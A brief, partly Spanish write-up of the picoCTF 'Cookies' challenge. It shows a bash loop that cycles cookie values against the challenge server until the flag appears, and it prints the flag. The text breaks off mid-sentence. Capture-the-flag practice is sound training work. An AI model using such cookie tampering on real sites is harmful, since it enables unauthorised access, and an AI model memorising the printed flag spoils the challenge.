Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)


Hints:
(None)
## Solución:


Entro a la pagian me regstro copeo el link
http://mercury.picoctf.net:21485/check

brisguz@DESKTOP-8V24E1B:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
brisguz@DESKTOP-8V24E1B:~$



o usando
